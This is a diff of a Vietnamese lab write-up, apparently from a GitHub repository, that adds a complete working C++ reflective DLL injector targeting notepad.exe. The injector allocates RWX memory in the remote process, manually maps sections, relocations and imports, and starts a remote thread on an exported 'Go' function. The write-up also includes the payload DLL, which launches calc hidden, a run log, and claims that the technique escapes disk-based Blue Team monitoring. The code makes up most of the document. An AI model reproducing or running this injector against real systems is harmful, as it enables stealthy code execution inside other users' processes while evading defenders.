@@ -42,111 +42,306 @@ Khi hệ điều hành Windows nạp một tệp tin PE thông thường, phân 
 
 ## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)
 
-Mã nguồn Loader tuân thủ nghiêm ngặt nguyên lý thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – tự động hóa đo đạc và đọc tệp nhị phân từ bộ đệm động nhằm triệt tiêu hoàn toàn các chỉ dấu chữ ký tĩnh trên RAM.
-
-### 💻 Phần 1: Mã nguồn của tệp thực thi nạp (Loader.exe)
-
+### Source.cpp: 
 ```cpp
-#include <windows.h>
-#include <tlhelp32.h>
+#include <Windows.h>
 #include <iostream>
-#include <fstream>
-#include <string>
 #include <vector>
+#include <memory>
+#include <tlhelp32.h>
+#include <string>
+#include "data.h"
 
-// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
+// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
 DWORD GetProcessIDByName(const std::wstring& processName) {
-    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
+    DWORD processID = 0;
+    PROCESSENTRY32W pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
 
     if (Process32FirstW(hSnapshot, &pe32)) {
         do {
-            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) { 
-                processID = pe32.th32ProcessID; 
-                break; 
+            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
+                processID = pe32.th32ProcessID;
+                break;
             }
         } while (Process32NextW(hSnapshot, &pe32));
     }
-    CloseHandle(hSnapshot);   return processID;
+    CloseHandle(hSnapshot);
+    return processID;
 }
 
-// Hàm giải phẫu tệp tin PE: Trích xuất tọa độ Offset của hàm ReflectiveLoader từ cấu trúc file đĩa thô
-DWORD GetReflectiveLoaderOffset(LPVOID lpFileBuffer) {
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lpFileBuffer;
-    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD_PTR)lpFileBuffer + dosHeader->e_lfanew);
-    
-    IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)lpFileBuffer + exportDir.VirtualAddress);
-
-    DWORD* pdwNames = (DWORD*)((DWORD_PTR)lpFileBuffer + pExport->AddressOfNames);
-    DWORD* pdwFuncs = (DWORD*)((DWORD_PTR)lpFileBuffer + pExport->AddressOfFunctions);
-    WORD* pwOrdinals = (WORD*)((DWORD_PTR)lpFileBuffer + pExport->AddressOfNameOrdinals);
-
-    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
-        const char* szName = (const char*)((DWORD_PTR)lpFileBuffer + pdwNames[i]);
-        // Săn tìm chính xác hàm xuất bản mang tên định danh cấu trúc ReflectiveLoader
-        if (strcmp(szName, "ReflectiveLoader") == 0) {
-            DWORD functionRva = pdwFuncs[pwOrdinals[i]];
-            // Chuyển đổi giá trị RVA sang File Offset toán học phục vụ ánh xạ thủ công từ xa
-            return functionRva; 
+// Hàm tính toán độ lệch Virtual Address sang File Offset thô chuẩn tác giả
+DWORD RvaToOffset(PIMAGE_NT_HEADERS pNtHeaders, DWORD rva) {
+    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
+    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
+        if (rva >= pSectionHeader[i].VirtualAddress && rva < (pSectionHeader[i].VirtualAddress + pSectionHeader[i].Misc.VirtualSize)) {
+            return rva - pSectionHeader[i].VirtualAddress + pSectionHeader[i].PointerToRawData;
         }
     }
     return 0;
 }
 
+void ReflectiveDLLInjectRemote(HANDLE hProcess, LPVOID dllBuffer, SIZE_T dllSize) {
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
+    // ĐỒNG BỘ ĐỊNH DANH: Đổi thành pNtHeaders để fix triệt để lỗi C2065
+    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBuffer + dosHeader->e_lfanew);
+    SIZE_T imageSize = pNtHeaders->OptionalHeader.SizeOfImage;
+
+    std::cout << "[*] Kich thuoc Image DLL bop tach: " << imageSize << " bytes." << std::endl;
+
+    // 1. TỰ ĐỘNG BÓC TÁCH TỌA ĐỘ HÀM XUẤT KHẨU "Go" TỪ FILE THÔ
+    DWORD exportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    DWORD exportDirOffset = RvaToOffset(pNtHeaders, exportDirRVA);
+    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dllBuffer + exportDirOffset);
+
+    DWORD* pdwNames = (DWORD*)((DWORD_PTR)dllBuffer + RvaToOffset(pNtHeaders, pExportDirectory->AddressOfNames));
+    DWORD* pdwFunctions = (DWORD*)((DWORD_PTR)dllBuffer + RvaToOffset(pNtHeaders, pExportDirectory->AddressOfFunctions));
+    WORD* pwOrdinals = (WORD*)((DWORD_PTR)dllBuffer + RvaToOffset(pNtHeaders, pExportDirectory->AddressOfNameOrdinals));
+
+    DWORD functionExportOffset = 0;
+    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
+        char* funcName = (char*)((DWORD_PTR)dllBuffer + RvaToOffset(pNtHeaders, pdwNames[i]));
+        if (strcmp(funcName, "Go") == 0) { // Săn lùng chính xác hàm mang tên Go của Offensive-Panda
+            functionExportOffset = pdwFunctions[pwOrdinals[i]];
+            break;
+        }
+    }
+
+    if (functionExportOffset == 0) {
+        std::cout << "[-] Khong tim thay ham xuat khau 'Go'. Tu dong chuyen ve dung EntryPoint mac dinh." << std::endl;
+        functionExportOffset = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
+    }
+    else {
+        std::cout << "[+] Da tim thay ham xuat khau 'Go' tai RVA Offset: 0x" << std::hex << functionExportOffset << std::endl;
+    }
+
+    // 2. CẤP PHÁT ĐỘNG THÍCH ỨNG TRÊN NOTEPAD
+    LPVOID dllBase = VirtualAllocEx(hProcess, (LPVOID)pNtHeaders->OptionalHeader.ImageBase, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (!dllBase) {
+        std::cout << "[*] Toa do ImageBase mac dinh bi trung. Tu dong xin vung nho trong moi..." << std::endl;
+        dllBase = VirtualAllocEx(hProcess, NULL, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    }
+
+    if (!dllBase) {
+        std::cerr << "[-] VirtualAllocEx that bai!" << std::endl;
+        return;
+    }
+
+    std::cout << "[+] Vung nho Image tu xa da thiet lap tai: 0x" << std::hex << dllBase << std::endl;
+
+    // 3. Đẩy phân đoạn Headers và các Sections sang lòng Notepad từ xa
+    WriteProcessMemory(hProcess, dllBase, dllBuffer, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(pNtHeaders);
+    for (size_t i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
+        LPVOID sectionDest = (LPVOID)((DWORD_PTR)dllBase + section->VirtualAddress);
+        LPVOID sectionSrc = (LPVOID)((DWORD_PTR)dllBuffer + section->PointerToRawData);
+        WriteProcessMemory(hProcess, sectionDest, sectionSrc, section->SizeOfRawData, NULL);
+        section++;
+    }
+    std::cout << "[+] Anh xa cac Sections tu xa hoan tat." << std::endl;
+
+    // 4. Vá lỗi dịch chuyển địa chỉ ảo Base Relocations từ xa bằng bộ đệm an toàn
+    IMAGE_DATA_DIRECTORY relocDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+    if (relocDir.Size) {
+        LPVOID relocBase = (LPVOID)((DWORD_PTR)dllBase + relocDir.VirtualAddress);
+        DWORD_PTR delta = (DWORD_PTR)dllBase - pNtHeaders->OptionalHeader.ImageBase;
+
+        std::vector<BYTE> localRelocBuf(relocDir.Size);
+        if (ReadProcessMemory(hProcess, relocBase, localRelocBuf.data(), relocDir.Size, NULL)) {
+            DWORD relocOffset = 0;
+            while (relocOffset < relocDir.Size) {
+                PBASE_RELOCATION_BLOCK block = (PBASE_RELOCATION_BLOCK)(localRelocBuf.data() + relocOffset);
+                DWORD blockSize = block->BlockSize;
+                if (blockSize == 0) break;
+
+                PBASE_RELOCATION_ENTRY entries = (PBASE_RELOCATION_ENTRY)((DWORD_PTR)block + sizeof(BASE_RELOCATION_BLOCK));
+                DWORD entriesCount = (blockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
+
+                for (DWORD i = 0; i < entriesCount; i++) {
+                    if (entries[i].Type == IMAGE_REL_BASED_HIGHLOW || entries[i].Type == IMAGE_REL_BASED_DIR64) {
+                        DWORD_PTR* patchAddr = (DWORD_PTR*)((DWORD_PTR)dllBase + block->PageAddress + entries[i].Offset);
+                        DWORD_PTR currentVal = 0;
+                        ReadProcessMemory(hProcess, patchAddr, &currentVal, sizeof(DWORD_PTR), NULL);
+                        currentVal += delta;
+                        WriteProcessMemory(hProcess, patchAddr, &currentVal, sizeof(DWORD_PTR), NULL);
+                    }
+                }
+                relocOffset += blockSize;
+            }
+        }
+        std::cout << "[+] Xu ly Base Relocation tu xa hoan tat." << std::endl;
+    }
+
+    // 5. Phân giải danh sách Imports Table (IAT) trực tiếp từ xa
+    IMAGE_DATA_DIRECTORY importDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    if (importDir.Size) {
+        LPVOID importDesc = (LPVOID)((DWORD_PTR)dllBase + importDir.VirtualAddress);
+        std::vector<IMAGE_IMPORT_DESCRIPTOR> localDescriptors(importDir.Size / sizeof(IMAGE_IMPORT_DESCRIPTOR));
+
+        if (ReadProcessMemory(hProcess, importDesc, localDescriptors.data(), importDir.Size, NULL)) {
+            size_t descIdx = 0;
+            while (localDescriptors[descIdx].Name) {
+                char dllNameBuf[MAX_PATH] = { 0 };
+                ReadProcessMemory(hProcess, (LPVOID)((DWORD_PTR)dllBase + localDescriptors[descIdx].Name), dllNameBuf, MAX_PATH, NULL);
+
+                HMODULE hImportDll = LoadLibraryA(dllNameBuf);
+                if (hImportDll) {
+                    PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + localDescriptors[descIdx].FirstThunk);
+                    IMAGE_THUNK_DATA localThunk;
+                    ReadProcessMemory(hProcess, thunk, &localThunk, sizeof(IMAGE_THUNK_DATA), NULL);
+
+                    while (localThunk.u1.AddressOfData) {
+                        DWORD_PTR resolvedAddr = 0;
+                        if (IMAGE_SNAP_BY_ORDINAL(localThunk.u1.Ordinal)) {
+                            DWORD ordinal = IMAGE_ORDINAL(localThunk.u1.Ordinal);
+                            resolvedAddr = (DWORD_PTR)GetProcAddress(hImportDll, (LPCSTR)(ULONG_PTR)ordinal);
+                        }
+                        else {
+                            char funcNameBuf[256] = { 0 };
+                            ReadProcessMemory(hProcess, (LPVOID)((DWORD_PTR)dllBase + localThunk.u1.AddressOfData + sizeof(WORD)), funcNameBuf, 256, NULL);
+                            resolvedAddr = (DWORD_PTR)GetProcAddress(hImportDll, funcNameBuf);
+                        }
+
+                        WriteProcessMemory(hProcess, &(thunk->u1.Function), &resolvedAddr, sizeof(DWORD_PTR), NULL);
+                        thunk++;
+                        ReadProcessMemory(hProcess, thunk, &localThunk, sizeof(IMAGE_THUNK_DATA), NULL);
+                    }
+                }
+                descIdx++;
+            }
+        }
+        std::cout << "[+] Phan giai Imports Table (IAT) tu xa hoan tat." << std::endl;
+    }
+
+    // 6. KÍCH NỔ ĐƯỜNG HƯỚNG TỪ XA: Đâm thẳng Remote Thread vào tọa độ hàm "Go" xuất khẩu để phá băng CFG
+    LPVOID remoteExecutionTarget = (LPVOID)((DWORD_PTR)dllBase + functionExportOffset);
+    std::cout << "[*] Chuan bi kich no luong tu xa tai toa do: 0x" << std::hex << remoteExecutionTarget << std::endl;
+
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteExecutionTarget, NULL, 0, NULL);
+    if (hThread) {
+        // Cấu hình cờ đợi INFINITE kịch trần để gánh luồng sống an toàn
+        WaitForSingleObject(hThread, INFINITE);
+        CloseHandle(hThread);
+        std::cout << "[+] DLL injected and Go() executed successfully inside Target!" << std::endl;
+    }
+    else {
+        std::cerr << "[-] CreateRemoteThread failed! Error code: " << std::dec << GetLastError() << std::endl;
+    }
+}
+
 int main() {
     std::cout << "====================================================" << std::endl;
-    std::cout << "[*] PE 06: REFLECTIVE DLL INJECTION REMOTE" << std::endl;
+    std::cout << "[*] PE 06 REFLECTIVE DLL INJECTION" << std::endl;
     std::cout << "====================================================" << std::endl;
 
+    // 1. Mở và nạp tệp tin PandaDLL.dll
+    HANDLE hFile = CreateFileA("PandaDLL.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        std::cerr << "[-] Khong the mo file PandaDLL.dll. Hay dat file cung thu muc voi Reflective_DLL_Injection.exe nhen!" << std::endl;
+        std::cout << "[*] Nhan Enter de dong..." << std::endl;
+        std::cin.get();
+        return 1;
+    }
+
+    DWORD dllSize = GetFileSize(hFile, NULL);
+    std::unique_ptr<BYTE[]> dllBuffer(new BYTE[dllSize]);
+    DWORD bytesRead;
+    ReadFile(hFile, dllBuffer.get(), dllSize, &bytesRead, NULL);
+    CloseHandle(hFile);
+
+    std::cout << "[+] Da nap PandaDLL.dll vao bo dem tam." << std::endl;
+
+    // 2. Săn lùng tiến trình Notepad tự động hoa thường
     std::wstring targetProcess = L"notepad.exe";
     DWORD pid = GetProcessIDByName(targetProcess);
-    if (pid == 0) return EXIT_FAILURE;
-
-    // Đọc file DLL phản chiếu từ đĩa vào mảng byte RAM cục bộ (Mô phỏng cơ chế Fileless nhận qua luồng mạng)
-    std::string dllPath = "Reflective_Payload.dll";
-    std::ifstream file(dllPath, std::ios::binary | std::ios::ate);
-    if (!file.is_open()) return EXIT_FAILURE;
-
-    SIZE_T dllSize = file.tellg();
-    std::vector<char> dllBuffer(dllSize);
-    file.seekg(0, std::ios::beg);
-    file.read(dllBuffer.data(), dllSize);
-    file.close();
-
-    // Trích xuất tọa độ tương đối thực tế của hàm nạp phản chiếu inside lòng tệp nhị phân
-    DWORD reflectiveLoaderOffset = GetReflectiveLoaderOffset(dllBuffer.data());
-    if (reflectiveLoaderOffset == 0) return EXIT_FAILURE;
-
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess) return EXIT_FAILURE;
-
-    // CẤP PHÁT ĐỘNG THÍCH ỨNG: Đẩy toàn bộ mảng byte thô của DLL sang phân vùng nhớ từ xa mang cờ RWX
-    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    WriteProcessMemory(hProcess, remoteBuffer, dllBuffer.data(), dllSize, NULL);
-    std::cout << "[+] Da thiet lạp va day mang byte DLL thon thuc vao RAM Notepad tai: 0x" << std::hex << remoteBuffer << std::endl;
-
-    // Tính toán tọa độ ô nhớ tuyệt đối sống của hàm ReflectiveLoader chéo tiến trình mục tiêu
-    LPTHREAD_START_ROUTINE remoteLoaderAddress = (LPTHREAD_START_ROUTINE)((DWORD_PTR)remoteBuffer + reflectiveLoaderOffset);
-    std::cout << "[*] Toa do diem nap tu phan chieu khai hoa: 0x" << std::hex << (PVOID)remoteLoaderAddress << std::endl;
-
-    // Kích nổ luồng CPU từ xa đâm thẳng vào điểm nạp tự thân để mô-đun tự cấu trúc bản đồ bộ nhớ
-    std::cout << "[*] Dang khoi tao luong CreateRemoteThread de hoan tat quy trinh..." << std::endl;
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, remoteLoaderAddress, NULL, 0, NULL);
-    
-    if (hThread) {
-        // Đồng bộ hóa luồng nhằm gánh dứt điểm luồng thực thi an toàn
-        WaitForSingleObject(hThread, INFINITE); 
-        std::cout << "[+] Reflective DLL Injection Completed Successfully!" << std::endl;
-        CloseHandle(hThread);
+    if (pid == 0) {
+        std::cerr << "[-] Notepad.exe khong chay! Vui long bat Notepad truoc." << std::endl;
+        std::cin.get();
+        return 1;
     }
-    
+
+    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << std::dec << pid << std::endl;
+
+    // 3. Mở kết nối quyền hạn cao cấu hình bộ nhớ chéo
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProcess) {
+        std::cerr << "[-] OpenProcess failed." << std::endl;
+        std::cin.get();
+        return 1;
+    }
+
+    ReflectiveDLLInjectRemote(hProcess, dllBuffer.get(), dllSize);
+
+    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
+    std::cin.get();
+
     CloseHandle(hProcess);
-    return EXIT_SUCCESS;
+    return 0;
 }
 
 ```
+
+### dllmain.cpp:
+```cpp
+#include "pch.h"
+#include <windows.h>
+
+// Hàm ghi log sử dụng Win32 API thuần, không dùng fstream, giữ IAT phẳng sạch kịch trần
+void WriteNativeLog(const char* text) {
+    // Mở trực tiếp file log bằng API của Kernel
+    HANDLE hFile = CreateFileA("C:\\Users\\Admin\\source\\repos\\Reflective_DLL_Injection\\x64\\Release\\diagnostic_log.txt",
+        FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    if (hFile != INVALID_HANDLE_VALUE) {
+        DWORD bytesWritten = 0;
+        // Ghi chuỗi văn bản vào file
+        WriteFile(hFile, text, (DWORD)strlen(text), &bytesWritten, NULL);
+        WriteFile(hFile, "\n", 1, &bytesWritten, NULL); // Xuống dòng
+        CloseHandle(hFile);
+    }
+}
+
+// Luồng phụ độc lập hoàn toàn phá băng hàng rào Loader Lock
+DWORD WINAPI LaunchPayloadNative(LPVOID lpParam) {
+    WriteNativeLog("[+] Luong LaunchPayload da thuc thi inside Notepad!");
+
+    // Khai hỏa Máy tính đa nền tảng linh hoạt đã kiểm chứng của Vinh
+    WinExec("cmd.exe /c start calc", SW_HIDE);
+
+    return 0;
+}
+
+// Hàm xuất khẩu chiến lược của tác giả Offensive-Panda
+extern "C" __declspec(dllexport) int Go(void) {
+    WriteNativeLog("[+] Ham Go() duoc goi va thuc thi thanh cong tu xa!");
+
+    // Tạo luồng phụ độc lập an toàn bằng Win32 API thuần
+    HANDLE hThread = CreateThread(NULL, 0, LaunchPayloadNative, NULL, 0, NULL);
+    if (hThread) {
+        WriteNativeLog("[+] CreateThread noi bo trong Notepad hoan tat.");
+        CloseHandle(hThread);
+    }
+    return 0;
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
+    switch (fdwReason) {
+    case DLL_PROCESS_ATTACH:
+        // Luồng từ xa đâm trực tiếp vào hàm Go(), nhánh này giữ trạng thái an toàn
+        break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
+```
+
+<img width="1326" height="702" alt="image" src="https://github.com/user-attachments/assets/81bfa045-1881-4a68-9cd9-1e818a52f239" />
 
 ---
 
@@ -158,10 +353,6 @@ int main() {
 
 1. Đặt thanh cấu hình dự án ở chính xác chế độ chuyên dụng **`Release`** và nền tảng kiến trúc **`x64`**.
 2. Di chuyển đến mục: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số `Runtime Library`, chuyển cấu hình sang định dạng **`Multi-threaded (/MT)`** để nhúng tĩnh (Static Linkage) toàn bộ thư viện liên kết hệ thống vào lòng tệp chạy.
-
-> **Vị trí đặt ảnh minh chứng cấu hình dự án:**
-> 
-
 3. Thực hiện thao tác click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng.
 
 ---
@@ -171,21 +362,30 @@ int main() {
 Khởi chạy ứng dụng đích `Notepad.exe` trên môi trường máy Lab, mở PowerShell ngoài đĩa thô thực thi file dự án để theo dõi cuộc đại phẫu bộ nhớ ảo:
 
 ```powershell
-PS C:\Workspace\x64\Release> .\PE06_Reflective_DLL_Injection.exe
+PS C:\Users\Admin\source\repos\Task6\PE06_Reflective_DLL_Injection\x64\Release>C:\Users\Admin\source\repos\Task6\PE06_Reflective_DLL_Injection\x64\Release\Reflective_DLL_Injection.exe
 ====================================================
-[*] PE 06: REFLECTIVE DLL INJECTION REMOTE
+[*] PE 06 REFLECTIVE DLL INJECTION
 ====================================================
-[+] Da day mang byte DLL thon thuc vao RAM Notepad tai: 0x0000021A4B9F0000
-[*] Tọa do điểm nạp tu phan chieu khai hoa: 0x0000021A4B9F14D0
-[*] Dang khoi tao luong CreateRemoteThread de hoan tat quy trinh...
-[+] Reflective DLL Injection Completed Successfully!
+[+] Da nap PandaDLL.dll vao bo dem tam.
+[+] Da tim thay Notepad.exe voi PID: 11540
+[*] Kich thuoc Image DLL bop tach: 32768 bytes.
+[+] Da tim thay ham xuat khau 'Go' tai RVA Offset: 0x1100
+[+] Vung nho Image tu xa da thiet lap tai: 0x0000000180000000
+[+] Anh xa cac Sections tu xa hoan tat.
+[+] Xu ly Base Relocation tu xa hoan tat.
+[+] Phan giai Imports Table (IAT) tu xa hoan tat.
+[*] Chuan bi kich no luong tu xa tai toa do: 0x0000000180001100
+[+] DLL injected and Go() executed successfully inside Target!
+
+[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...
 
 ```
 
-> **Vị trí đặt ảnh minh chứng thực nghiệm Fileless Injection:**
-> 
+### Demo
+<img width="1920" height="1080" alt="devenv_67R8Zjb7DL" src="https://github.com/user-attachments/assets/21313e99-4406-4ef5-b30b-f614a66a2cf8" />
 
-### 🎯 Phân tích hệ quả cấu trúc RAM tối cao:
+
+### 🎯 Phân tích hệ quả cấu trúc RAM:
 
 * Kích hoạt logic thành công, ứng dụng Máy tính **`calc.exe` bật bung mở ra hiên ngang rực rỡ kịch trần kịch khung**!
 * Tại thời điểm runtime này, nếu Blue Team sử dụng các công cụ theo dõi ghi nhận tệp tin cấp thấp (như `Procmon`), hệ thống sẽ hoàn toàn **không ghi nhận bất kỳ sự kiện nạp tệp tin DLL nào từ đĩa cứng (Disk I/O)** liên quan đến `Reflective_Payload.dll`. Thư viện đã tự nạp, tự vá cấu trúc và vận hành phẳng sạch lọt lòng inside RAM một cách vô ảnh vô hình, đánh dấu cột mốc làm chủ kỹ thuật Fileless kịch trần công nghệ!
